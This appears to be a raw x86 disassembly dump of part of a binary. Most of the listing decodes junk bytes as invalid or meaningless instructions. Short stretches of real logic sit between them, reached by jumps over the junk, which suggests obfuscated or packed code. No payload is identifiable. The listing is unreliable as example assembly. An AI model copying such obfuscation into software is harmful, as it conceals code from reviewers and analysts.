  40f0f7:	repz popa 
  40f0f9:	pop    ebx
  40f0fa:	fwait
  40f0fb:	jmp    0x214e4b73
  40f100:	xor    BYTE PTR [edi],ch
  40f102:	out    dx,eax
  40f103:	ret    0x36db
  40f106:	add    ah,al
  40f108:	shr    BYTE PTR [ecx],cl
  40f10a:	and    DWORD PTR [ebx+0x406a1396],eax
  40f110:	mov    eax,0xb823707f
  40f115:	out    0x28,eax
  40f117:	enter  0x42c1,0xe9
  40f11b:	jp     0x40f0c0
  40f11d:	into   
  40f11e:	xchg   edx,eax
  40f11f:	mov    BYTE PTR [edi-0xa5fe2f5],0xa1
  40f126:	lods   eax,DWORD PTR ds:[esi]
  40f127:	ret    
  40f128:	call   DWORD PTR [ebx]
  40f12a:	int3   
  40f12b:	fmul   DWORD PTR [eax]
  40f12d:	enter  0xa10d,0xb7
  40f131:	fld    QWORD PTR [ecx-0x75ab9e33]
  40f137:	ret    0xdb85
  40f13a:	idiv   DWORD PTR ds:0x5264a3aa
  40f140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f141:	(bad)  
  40f142:	sub    eax,0x1e997f24
  40f147:	or     eax,0x294cf799
  40f14c:	aad    0xf9
  40f14e:	dec    eax
  40f14f:	push   edi
  40f150:	scas   eax,DWORD PTR es:[edi]
  40f151:	dec    esi
  40f152:	test   DWORD PTR [edi],ecx
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   ebx,ebx
  40f16e:	lea    eax,[esi]
  40f170:	adc    ah,BYTE PTR [ebx-0x3c8f8f56]
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1b6
  40f17a:	ins    DWORD PTR es:[edi],dx
  40f17b:	idiv   DWORD PTR ds:0x878308f5
  40f181:	add    esp,DWORD PTR [ebx+0x42]
  40f184:	bound  edx,QWORD PTR [edi]
  40f186:	xchg   ebx,eax
  40f187:	pop    eax
  40f188:	bound  eax,QWORD PTR [ebp+ebx*2+0x56]
  40f18c:	add    bl,BYTE PTR [ecx]
  40f18e:	sar    DWORD PTR [edx-0x24feead7],cl
  40f194:	cld    
  40f195:	js     0x40f165
  40f197:	push   edi
  40f198:	push   ds
  40f199:	call   0xc7a2211e
  40f19e:	inc    esp
  40f19f:	sbb    dh,cl
  40f1a1:	push   esi
  40f1a2:	pop    eax
  40f1a3:	(bad)  
  40f1a4:	inc    dh
  40f1a6:	(bad)  
  40f1a7:	out    dx,eax
  40f1a8:	cs dec esp
  40f1aa:	shl    bl,0x74
  40f1ad:	push   ss
  40f1ae:	mov    edi,0x771e1a79
  40f1b3:	nop
  40f1b4:	push   ebx
  40f1b5:	imul   esi,esp,0x6845c51c
  40f1bb:	rcr    BYTE PTR [edi+0x1e],cl
  40f1be:	dec    esp
  40f1bf:	mov    gs,edx
  40f1c1:	cmp    al,0xd8
  40f1c3:	je     0x40f1b4
  40f1c5:	stos   BYTE PTR es:[edi],al
  40f1c6:	daa    
  40f1c7:	sbb    eax,0x9440e1c
  40f1cc:	mov    BYTE PTR [ebp+eax*4-0x6d367245],bh
  40f1d3:	iret   
  40f1d4:	aam    0x49
  40f1d6:	mov    BYTE PTR [edx-0x3d],ch
  40f1d9:	sub    BYTE PTR [ecx+esi*8+0x5540dc4],dl
  40f1e0:	inc    ebx
  40f1e1:	ds mov bh,0x10
  40f1e4:	mov    esi,0x391eb33a
  40f1e9:	out    dx,al
  40f1ea:	push   ebp
  40f1eb:	rol    DWORD PTR ds:0x7db5357,cl
  40f1f1:	out    0xf6,al
  40f1f3:	push   cs
  40f1f4:	(bad)  
  40f1f5:	fisub  DWORD PTR [esi*2+0x51b31fd9]
  40f1fc:	mov    ah,0xff
  40f1fe:	fisubr WORD PTR [ebx+0x68]
  40f201:	and    eax,0x831d1dc8
  40f206:	aas    
  40f207:	test   ah,cl
  40f209:	pop    edi
  40f20a:	adc    dl,BYTE PTR [edx+0x75]
  40f20d:	mov    BYTE PTR [edi-0x44],al
  40f210:	jae    0x40f24f
  40f212:	push   ss
  40f213:	sub    DWORD PTR [eax+edi*8],0xffffffd8
  40f217:	lods   eax,DWORD PTR ds:[esi]
  40f218:	jmp    0x3d18279b
  40f21d:	ret    
  40f21e:	dec    ebx
  40f21f:	push   cs
  40f220:	mov    edi,0xae074570
  40f225:	addr16 cld 
  40f227:	xchg   ebx,eax
  40f228:	int    0xdb
  40f22a:	popf   
  40f22b:	push   esp
  40f22c:	je     0x40f23c
  40f22e:	or     al,0xd5
  40f230:	jl     0x40f2ae
  40f232:	(bad)  
  40f233:	addr16 inc ebx
  40f235:	sti    
  40f236:	dec    DWORD PTR [esi]
  40f238:	ins    DWORD PTR es:[edi],dx
  40f239:	xor    dh,al
  40f23b:	aad    0xaf
  40f23d:	es xchg edi,eax
  40f23f:	loopne 0x40f288
  40f241:	adc    ebp,eax
  40f243:	call   0x8b59e4bb
  40f248:	lods   eax,DWORD PTR ds:[esi]
  40f249:	stc    
  40f24a:	add    eax,0x36f79d1a
  40f24f:	sub    bl,bl
  40f251:	adc    BYTE PTR [eax+ebx*1+0x103c8ac5],cl
  40f258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f259:	jae    0x40f288
  40f25b:	add    al,0xaa
  40f25d:	test   eax,0xe5c9ff97
  40f262:	in     al,dx
  40f263:	inc    ebx
  40f264:	sub    ebx,esi
  40f266:	neg    BYTE PTR [edx-0x2966d804]
  40f26c:	(bad)  
  40f26d:	cmp    ch,BYTE PTR [ebp+0x1b70b81b]
  40f273:	js     0x40f29a
  40f275:	dec    ebx
  40f276:	sbb    dl,dh
  40f278:	repnz sub DWORD PTR [eax+eiz*4],eax
  40f27c:	push   eax
  40f27d:	gs sub edx,edx
  40f280:	fcomip st,st(6)
  40f282:	sti    
  40f283:	xor    al,0xea
  40f285:	xchg   ah,dl
  40f287:	jae    0x40f243
  40f289:	cmc    
  40f28a:	inc    edi
  40f28b:	pop    ecx
  40f28c:	test   dh,cl
  40f28e:	push   0xffffffa9
  40f290:	and    BYTE PTR [ebp-0x2532748],dh
  40f296:	daa    
  40f297:	and    ebp,DWORD PTR [esi]
  40f299:	icebp  
  40f29a:	add    eax,0x83e2c747
  40f29f:	out    dx,eax
  40f2a0:	in     eax,0x2
  40f2a2:	test   eax,0xfb9a214e
  40f2a7:	pop    ss
  40f2a8:	(bad)  
  40f2a9:	jmp    FWORD PTR [edx+0x41]
  40f2ac:	push   cs
  40f2ad:	inc    edi
  40f2ae:	pop    ebp
  40f2af:	loopne 0x40f2dd
  40f2b1:	or     eax,0xf9974733
  40f2b6:	stos   DWORD PTR es:[edi],eax
  40f2b7:	jmp    0x2270:0x15a9a8af
  40f2be:	sub    BYTE PTR [eax+edx*1],0x1e
  40f2c2:	cmp    bh,BYTE PTR [esi-0x3c]
  40f2c5:	adc    bh,al
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shl    bh,1
  40f2f8:	ins    DWORD PTR es:[edi],dx
  40f2f9:	clc    
  40f2fa:	les    esi,FWORD PTR [esi-0x57]
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f289
  40f304:	repz fdiv QWORD PTR ds:0x897ee61b
  40f30b:	xchg   edi,eax
  40f30c:	pop    ecx
  40f30d:	jle    0x40f2b0
  40f30f:	xor    BYTE PTR [ecx-0x20],dl
  40f312:	sbb    eax,0x2e78ff34
  40f317:	cli    
  40f318:	jge    0x40f2b7
  40f31a:	and    DWORD PTR [eax+0x7684b351],edx
  40f320:	pop    ebx
  40f321:	cs scas al,BYTE PTR es:[edi]
  40f323:	stc    
  40f324:	cmp    BYTE PTR [edi],bl
  40f326:	(bad)  
  40f327:	lock sahf 
  40f329:	push   eax
  40f32a:	sub    DWORD PTR [edx],ebp
  40f32c:	jecxz  0x40f331
  40f32e:	out    dx,eax
  40f32f:	pop    esp
  40f330:	dec    edx
  40f331:	(bad)  
  40f332:	loop   0x40f307
  40f334:	xor    eax,0x188e3c7b
  40f339:	cmp    cl,BYTE PTR ds:0x2c31b274
  40f33f:	test   BYTE PTR [edi],cl
  40f341:	dec    eax
  40f342:	xor    DWORD PTR [eax-0x1c5e7fac],eax
  40f348:	(bad)  
  40f349:	mov    ebp,DWORD PTR [eax+0x44170ae0]
  40f34f:	(bad)
  40f352:	mov    BYTE PTR [esi],ah
  40f354:	xchg   BYTE PTR [ecx+0x573aea01],al
  40f35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f35b:	xchg   esp,eax
  40f35c:	(bad)  
  40f35d:	scas   al,BYTE PTR es:[edi]
  40f35e:	adc    ch,dh
  40f360:	add    eax,0xc73a9614
  40f365:	lock outs dx,BYTE PTR ds:[esi]
  40f367:	jle    0x40f39e
  40f369:	inc    edx
  40f36a:	mov    ds:0x55596e96,al
  40f36f:	mov    esp,0x58eabad4
  40f374:	or     BYTE PTR [ecx-0x48],dh
  40f377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f378:	pop    esi
  40f379:	nop
  40f37a:	pop    ebx
  40f37b:	enter  0x930b,0x73
  40f37f:	retf   0x4dae
  40f382:	and    al,0x2f
  40f384:	frstpm(287 only) 
  40f386:	push   ebx
  40f387:	add    al,0x49
  40f389:	sar    BYTE PTR [ecx],1
  40f38b:	xor    bl,0xcf
  40f38e:	aas    
  40f38f:	sub    dl,BYTE PTR [ebx]
  40f391:	jp     0x40f353
  40f393:	fadd   QWORD PTR [ebx]
  40f395:	pop    ss
  40f396:	mov    DWORD PTR ds:0x845caca8,ebp
  40f39c:	xor    dl,BYTE PTR [edi+0x613104c5]
  40f3a2:	jns    0x40f3d4
  40f3a4:	int3   
  40f3a5:	mov    cl,0xe0
  40f3a7:	test   BYTE PTR [edx+0x7a5abb58],0xcb
  40f3ae:	lods   eax,DWORD PTR ds:[esi]
  40f3af:	push   ebx
  40f3b0:	fs jbe 0x40f345
  40f3b3:	dec    edx
  40f3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3b5:	in     al,0x9c
  40f3b7:	cmp    ax,0xba1f
  40f3bb:	push   edx
  40f3bc:	daa    
  40f3bd:	test   eax,0xf93a4836
  40f3c2:	out    0xff,eax
  40f3c4:	pop    ebx
  40f3c5:	jo     0x40f34a
  40f3c7:	gs in  al,dx
  40f3c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ca:	mov    ebx,0x19e9e188
  40f3cf:	ror    DWORD PTR [ebx+ebx*1],1
  40f3d2:	push   edi
  40f3d3:	adc    DWORD PTR [ecx+esi*4+0x3c4209c9],ecx
  40f3da:	stc    
  40f3db:	ret    0x3f63
  40f3de:	enter  0x53aa,0x15
  40f3e2:	jg     0x40f3a8
  40f3e4:	or     BYTE PTR [edx],ch
  40f3e6:	rcl    DWORD PTR [edi+edx*4+0x5f],1
  40f3ea:	mov    es,esp
  40f3ec:	sbb    ebx,DWORD PTR [ecx+0x4b8ae04c]
  40f3f2:	pop    esp
  40f3f3:	rol    ch,0x6e
  40f3f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3f7:	fs in  al,0x44
  40f3fa:	repnz mov cl,0x3c
  40f3fd:	xchg   edi,eax
  40f3fe:	dec    edi
  40f3ff:	rcr    bh,cl
  40f401:	outs   dx,DWORD PTR ds:[esi]
  40f402:	fimul  DWORD PTR [edi-0xf]
  40f405:	push   esi
  40f406:	jmp    0x6feb4ba5
  40f40b:	inc    esi
  40f40c:	adc    al,0xf8
  40f40e:	fnstsw WORD PTR [esi-0x3eb83bd8]
  40f414:	arpl   WORD PTR [ebp-0x35cf73e7],bp
  40f41a:	adc    ecx,DWORD PTR [edi+0x5]
  40f41d:	mov    eax,ds:0xd84f9478
  40f422:	js     0x40f491
  40f424:	lods   al,BYTE PTR ds:[esi]
  40f425:	xchg   BYTE PTR [eax+0x71ace5be],ch
  40f42b:	jge    0x40f3c4
  40f42d:	sub    DWORD PTR [edi-0x7a],esp
  40f430:	clc    
  40f431:	ins    BYTE PTR es:[edi],dx
  40f432:	sahf   
  40f433:	or     al,0xc6
  40f435:	ret    
  40f436:	mov    ebp,0x27b79a40
  40f43b:	push   edx
  40f43c:	dec    ecx
  40f43d:	xor    eax,0x1525ef9e
  40f442:	cmp    eax,0x152d9af2
  40f447:	arpl   WORD PTR [ecx-0x669b000b],si
  40f44d:	test   DWORD PTR [esi],0xf8458b3e
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	jecxz  0x40f3e9
  40f466:	adc    al,0x7
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	jle    0x40f3fb
  40f472:	bndldx bnd1,[esi-0x6f]
  40f476:	xchg   ebx,eax
  40f477:	inc    ecx
  40f478:	add    edx,ecx
  40f47a:	cli    
  40f47b:	xchg   ebp,eax
  40f47c:	idiv   DWORD PTR [edx+0x3fb43d15]
  40f482:	(bad)  
  40f483:	enter  0x1b01,0x2
  40f487:	xor    al,0xc
  40f489:	mov    DWORD PTR [esi],edi
  40f48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f48c:	or     edi,DWORD PTR [ebx+0x1c]
  40f48f:	in     al,dx
  40f490:	iret   
  40f491:	adc    eax,0x60d37284
  40f496:	jl     0x40f42f
  40f498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f499:	inc    ebp
  40f49a:	ins    DWORD PTR es:[edi],dx
  40f49b:	inc    eax
  40f49c:	xor    dh,BYTE PTR [esp+edx*2+0x62bd63cd]
  40f4a3:	jle    0x40f465
  40f4a5:	mov    ebx,0x3a8c2851
  40f4aa:	or     ah,ch
  40f4ac:	dec    ebx
  40f4ad:	stos   BYTE PTR es:[edi],al
  40f4ae:	test   BYTE PTR [eax],bl
  40f4b0:	dec    ebx
  40f4b1:	or     DWORD PTR [ecx],edx
  40f4b3:	call   0x3fe88267
  40f4b8:	push   ss
  40f4b9:	stos   BYTE PTR es:[edi],al
  40f4ba:	test   BYTE PTR [eax+0x65],cl
  40f4bd:	int    0x27
  40f4bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c0:	xor    esp,esp
  40f4c2:	dec    eax
  40f4c3:	sbb    al,0xff
  40f4c5:	test   esp,esi
  40f4c7:	aad    0xab
  40f4c9:	test   eax,0x82121b35
  40f4ce:	(bad)  
  40f4cf:	push   0x5e1940b4
  40f4d4:	(bad)  
  40f4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d7:	push   es
  40f4d8:	(bad)
  40f4dc:	sub    esi,edx
  40f4de:	popa   
  40f4df:	repz add ch,BYTE PTR [ecx+0x7ff15bd5]
  40f4e6:	jno    0x40f54f
  40f4e8:	rol    BYTE PTR [edi+edx*8-0x2b2d695f],1
  40f4ef:	xchg   ecx,eax
  40f4f0:	xlat   BYTE PTR ds:[ebx]
  40f4f1:	pop    ebx
  40f4f2:	jg     0x40f4b1
  40f4f4:	mov    ds:0xb785e45a,eax
  40f4f9:	and    eax,0x47c88a4b
  40f4fe:	mov    esi,0xd952ef7
  40f503:	inc    eax
  40f504:	push   0xcfc9217f
  40f509:	sub    ebx,DWORD PTR [ebx]
  40f50b:	ds push ebx
  40f50d:	les    edx,FWORD PTR [edi+ecx*2-0x15]
  40f511:	mov    al,ds:0x3ed5824c
  40f516:	ror    BYTE PTR [eax-0x1f],1
  40f519:	outs   dx,DWORD PTR ds:[esi]
  40f51a:	xchg   ebx,eax
  40f51b:	mov    ebx,0x7e7cac73
  40f520:	jmp    0xd1af:0xc59d0eed
  40f527:	imul   ecx,DWORD PTR [edi+0x50],0xf4a6c1de
  40f52e:	jge    0x40f4b3
  40f530:	inc    ecx
  40f531:	pop    ecx
  40f532:	pop    edx
  40f533:	aam    0xf0
  40f535:	aaa    
  40f536:	inc    esp
  40f537:	inc    edi
  40f538:	pop    edi
  40f539:	enter  0x2d14,0xf3
  40f53d:	ret    0xa0dc
  40f540:	psubw  mm2,QWORD PTR [ecx]
  40f543:	bound  ebp,QWORD PTR [ebp-0x26ab5ede]
  40f549:	cld    
  40f54a:	push   eax
  40f54b:	xor    edx,DWORD PTR [ecx]
  40f54d:	shr    BYTE PTR [ebp+eax*8+0x5afadcee],cl
  40f554:	int    0x3a
  40f556:	int3   
  40f557:	lock jns 0x40f56c
  40f55a:	(bad)  
  40f55b:	mov    ds:0x40aeeb77,al
  40f560:	aad    0xbf
  40f562:	fadd   QWORD PTR [ebx-0x6c458119]
  40f568:	jbe    0x40f576
  40f56a:	sub    cl,dh
  40f56c:	fwait
  40f56d:	push   cs
  40f56e:	shl    bh,cl
  40f570:	shl    BYTE PTR [ecx],1
  40f572:	ficom  DWORD PTR [ecx+ebp*2+0x517fd4e4]
  40f579:	test   DWORD PTR [ebp-0x681279aa],ebp
  40f57f:	mov    BYTE PTR [eax],bl
  40f581:	add    DWORD PTR [ebx-0x17af302d],ebp
  40f587:	push   ds
  40f588:	dec    eax
  40f589:	ja     0x40f585
  40f58b:	das    
  40f58c:	stos   BYTE PTR es:[edi],al
  40f58d:	(bad)  
  40f58f:	mov    ds:0x52537d37,eax
  40f594:	mov    ah,0x10
  40f596:	adc    BYTE PTR [edi+0x583ef78b],0xf8
  40f59d:	(bad)  
  40f59e:	pop    ecx
  40f59f:	(bad)  
  40f5a0:	in     al,0xb8
  40f5a2:	lock push es
  40f5a4:	sti    
  40f5a5:	pop    ds
  40f5a6:	mov    al,BYTE PTR [eax]
  40f5a8:	sub    eax,0x49ae6f7e
  40f5ad:	or     edx,0xffffffd5
  40f5b0:	or     DWORD PTR [ecx-0x51],eax
  40f5b3:	std    
  40f5b4:	idiv   DWORD PTR [ebp+0x24faed8d]
  40f5ba:	cmp    BYTE PTR ds:0x8b008b8c,ah
  40f5c0:	inc    eax
  40f5c1:	cmp    al,0x8d
  40f5c3:	or     al,0xcd
  40f5c5:	js     0x40f5c7
  40f5c7:	add    BYTE PTR [eax],al
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	sub    al,0xd6
  40f605:	jns    0x40f62c
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	and    BYTE PTR [ecx],al
  40f611:	mov    eax,0x152a562f
  40f616:	adc    BYTE PTR [esi],al
  40f618:	ja     0x40f601
  40f61a:	rcl    DWORD PTR [edi+edi*2-0x4c],cl
  40f61e:	sbb    ch,BYTE PTR [esi+eax*1-0x44ffd273]
  40f625:	mov    bl,0x5f
  40f627:	and    bl,BYTE PTR [edi-0x4]
  40f62a:	in     eax,dx
  40f62b:	pop    esp
  40f62c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f62d:	jmp    0x7066:0xf553090
  40f634:	pop    esi
  40f635:	adc    DWORD PTR cs:[edi],ecx
  40f638:	xchg   DWORD PTR [eax-0x80],edi
  40f63b:	mov    cl,0x97
  40f63d:	lods   eax,DWORD PTR ds:[esi]
  40f63e:	pop    edi
  40f63f:	arpl   cx,bp
  40f641:	mov    esp,0xaa32119e
  40f646:	in     al,0xc8
  40f648:	lods   al,BYTE PTR ds:[esi]
  40f649:	shl    BYTE PTR [esi+0x33ef5554],cl
  40f64f:	mov    ebp,0x3e24bfe1
  40f654:	(bad)  
  40f655:	js     0x40f61e
  40f657:	jl     0x40f6a3
  40f659:	dec    BYTE PTR [ecx]
  40f65b:	mov    esp,0x2a689c9
  40f660:	mov    WORD PTR [ebp-0x874a277],?
  40f666:	add    al,0xff
  40f668:	jmp    FWORD PTR ds:0xc809ea3c
  40f66e:	inc    esp
  40f66f:	xor    BYTE PTR [ebp-0x53cb21af],bh
  40f675:	fcmovb st,st(4)
  40f677:	push   ss
  40f678:	les    ecx,FWORD PTR [edi+0x70]
  40f67b:	push   ebx
  40f67c:	push   es
  40f67d:	dec    esp
  40f67e:	xchg   esp,eax
  40f67f:	cld    
  40f680:	add    BYTE PTR [ebp-0x4f79e5d6],0xd
  40f687:	fs jp  0x40f706
  40f68a:	(bad)  
  40f68b:	mov    ch,bl
  40f68d:	mov    edi,0x97172fab
  40f692:	rcl    DWORD PTR [ecx+0x1f62e99f],cl
  40f698:	mov    bl,0x2b
  40f69a:	jne    0x40f684
  40f69c:	dec    edi
  40f69d:	adc    eax,0xd26c3d7d
  40f6a2:	jl     0x40f6e5
  40f6a4:	jne    0x40f676
  40f6a6:	mov    al,0x65
  40f6a8:	push   edx
  40f6a9:	mov    ecx,0x9b5ed34f
  40f6ae:	cli    
  40f6af:	iret   
  40f6b0:	test   eax,0x73977f25
  40f6b5:	in     eax,dx
  40f6b6:	jbe    0x40f702
  40f6b8:	push   edi
  40f6b9:	xchg   BYTE PTR [esi-0x7fef2252],al
  40f6bf:	stos   DWORD PTR es:[edi],eax
  40f6c0:	outs   dx,DWORD PTR ds:[esi]
  40f6c1:	js     0x40f6d0
  40f6c3:	push   edx
  40f6c4:	inc    ecx
  40f6c5:	out    0x47,al
  40f6c7:	leave  
  40f6c8:	ja     0x40f687
  40f6ca:	idiv   BYTE PTR [ebx-0x624555ba]
  40f6d0:	hlt    
  40f6d1:	imul   esp,DWORD PTR [ecx+0xf],0x16
  40f6d5:	test   BYTE PTR [ecx+0x2c301e0c],0xb4
  40f6dc:	sbb    eax,0x4de700d4
  40f6e1:	stc    
  40f6e2:	sub    DWORD PTR ds:0x16991c85,ebx
  40f6e8:	jae    0x40f725
  40f6ea:	fdiv   DWORD PTR [edi-0x4f36506c]
  40f6f0:	bound  ecx,QWORD PTR [ebx]
  40f6f2:	inc    ecx
  40f6f3:	je     0x40f6ec
  40f6f5:	fld    QWORD PTR [edx-0x7efd3401]
  40f6fb:	push   edi
  40f6fc:	xchg   ebx,eax
  40f6fd:	cwde   
  40f6fe:	fdiv   QWORD PTR [ebx+0x345dce5a]
  40f704:	and    DWORD PTR [esp+edi*1-0x2f],ebx
  40f708:	sbb    eax,0x22f368a1
  40f70d:	adc    ch,bl
  40f70f:	mov    al,ds:0x4c8bb8d3
  40f714:	sub    BYTE PTR [eax+0x5d6b5fc3],bl
  40f71a:	cld    
  40f71b:	shl    DWORD PTR [ebp+0x5],1
  40f71e:	or     DWORD PTR [ebx],esi
  40f720:	mov    ds:0xf03e32f,eax
  40f725:	dec    edi
  40f726:	xor    esp,DWORD PTR [esi]
  40f728:	fisttp WORD PTR [eax+0x44]
  40f72b:	pop    ebx
  40f72c:	jne    0x40f7a1
  40f72e:	ret    
  40f72f:	dec    esp
  40f730:	scas   eax,DWORD PTR es:[edi]
  40f731:	ds dec ebp
  40f733:	hlt    
  40f734:	xchg   DWORD PTR [edx-0x13087f97],edi
  40f73a:	dec    eax
  40f73b:	push   cs
  40f73c:	adc    al,0xb4
  40f73e:	sbb    cl,BYTE PTR [ecx+0x5e1ad3c1]
  40f744:	pop    edi
  40f745:	sar    ah,0x2a
  40f748:	je     0x40f724
  40f74a:	adc    al,BYTE PTR [edi-0x7da6b90e]
  40f750:	sbb    eax,0xd28e3fbe
  40f755:	or     esi,DWORD PTR [esi-0x16549571]
  40f75b:	dec    ebp
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x39c146f3
  40f7e3:	or     al,0x4d
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f77a
  40f7ee:	push   es
  40f7ef:	lods   eax,DWORD PTR ds:[esi]
  40f7f0:	mov    eax,0xfeb8e475
  40f7f5:	out    dx,al
  40f7f6:	jbe    0x40f811
  40f7f8:	xor    DWORD PTR [ebx+ebp*1],edi
  40f7fb:	add    BYTE PTR [esi+0x692cac6c],al
  40f801:	fisttp DWORD PTR [ebp+edi*2+0x44]
  40f805:	sbb    eax,0x3e3fa28
  40f80a:	fdivr  DWORD PTR [edi]
  40f80c:	jmp    0x40f79e
  40f80e:	mov    edi,0x62653215
  40f813:	xchg   DWORD PTR [esi+edi*8],ecx
  40f816:	add    BYTE PTR [ecx-0x51],cl
  40f819:	mov    edx,0xec42635a
  40f81e:	push   edx
  40f81f:	xor    dh,BYTE PTR [ecx+0x1e96e476]
  40f825:	mov    ch,0x48
  40f827:	jecxz  0x40f7a9
  40f829:	fs cs adc eax,esi
  40f82d:	ins    DWORD PTR es:[edi],dx
  40f82e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f82f:	aam    0xd
  40f831:	jae    0x40f89b
  40f833:	mov    al,ds:0xd19eda33
  40f838:	fwait
  40f839:	lods   eax,DWORD PTR ds:[esi]
  40f83a:	(bad)  
  40f83b:	sub    dl,BYTE PTR [edx+ebx*2+0xaee33dc]
  40f842:	(bad)
  40f845:	shl    DWORD PTR [ebp+0x6fe53132],0xc0
  40f84c:	and    BYTE PTR [eax-0x63],bh
  40f84f:	mov    ds:0x891cb9a5,eax
  40f854:	sbb    al,0xb
  40f856:	mov    esi,0xd78fc1a0
  40f85b:	stc    
  40f85c:	push   cs
  40f85d:	push   esp
  40f85e:	jmp    0x40f7f1
  40f860:	repz pop ebx
  40f863:	sar    DWORD PTR [ebp-0x46],0x2a
  40f867:	xor    BYTE PTR ds:0x48ca5686,ch
  40f86d:	test   DWORD PTR [esi],esp
  40f86f:	mov    bh,0x6a
  40f871:	adc    al,0xb9
  40f873:	cmp    BYTE PTR [edx-0x7e57fa45],dl
  40f879:	push   ecx
  40f87a:	fldlg2 
  40f87c:	stc    
